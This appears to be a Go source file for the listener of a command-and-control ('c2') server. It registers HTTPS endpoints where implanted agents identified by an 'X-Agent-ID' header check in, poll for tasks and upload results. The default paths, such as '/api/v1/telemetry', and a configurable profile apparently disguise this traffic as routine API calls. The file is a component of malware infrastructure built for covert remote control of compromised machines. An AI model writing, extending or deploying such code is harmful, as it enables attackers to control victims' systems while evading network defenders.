package main

import (
	"log"
	"net/http"
)

func startListener(addr, certFile, keyFile string) {
	mux := http.NewServeMux()

	handshakePath := PROFILE.Paths["handshake"]
	if handshakePath == "" {
		handshakePath = "/api/v1/auth"
	}
	beaconPath := PROFILE.Paths["beacon"]
	if beaconPath == "" {
		beaconPath = "/api/v1/sync"
	}
	resultPath := PROFILE.Paths["result"]
	if resultPath == "" {
		resultPath = "/api/v1/telemetry"
	}

	mux.HandleFunc(handshakePath, func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		handleHandshake(w, r, r.Header.Get("X-Agent-ID"))
	})
	mux.HandleFunc(beaconPath, func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		handleTaskPoll(w, r, r.Header.Get("X-Agent-ID"))
	})
	mux.HandleFunc(resultPath, func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		handleResult(w, r, r.Header.Get("X-Agent-ID"))
	})

	log.Printf("[c2] listening on %s (handshake=%s beacon=%s result=%s)", addr, handshakePath, beaconPath, resultPath)
	if err := http.ListenAndServeTLS(addr, certFile, keyFile, mux); err != nil {
		log.Fatalf("[c2] %v", err)
	}
}
